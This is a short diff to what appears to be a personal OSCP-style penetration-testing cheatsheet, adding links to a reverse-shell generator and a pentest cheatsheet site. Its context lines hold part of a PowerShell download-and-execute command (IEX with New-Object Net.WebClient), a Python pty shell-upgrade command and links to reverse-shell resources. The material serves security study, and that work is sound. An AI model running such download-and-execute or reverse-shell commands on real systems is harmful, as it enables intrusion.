@@ -1216,6 +1216,9 @@ C:\Windows\sysNative\windows\powershell\v1.0\powershell.exe IEX(New-Object Net.W
 
 [Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
+[Reverse Shells Generator](https://tex2e.github.io/reverse-shell-generator/index.html)
+
+
 ### Upgrade simple shell to tty shell to fully interactive shell
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -1252,6 +1255,7 @@ For windows, use this [tool](https://github.com/antonioCoco/ConPtyShell)
 ### Some other useful cheatsheets or website
 * [Windows version GTFOBins](https://lolbas-project.github.io/)
 * [AD version GTFOBins](https://wadcoms.github.io/)
+* [Penetration Testing & Security Research - Cheatsheets](https://highon.coffee/)
 * [List of practice machine](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html)
 * [Playlist of ippsec OSCP-like machines walkthrough](https://www.youtube.com/playlist?list=PLidcsTyj9JXK-fnabFLVEvHinQ14Jy5tf)
 * [Playlist of ippsec for AD prep](https://www.youtube.com/playlist?list=PLbK3lpDL_g6ChnJ9E8LB30dezPfuzgaBI), probably overkilled but I learnt a lot from it.
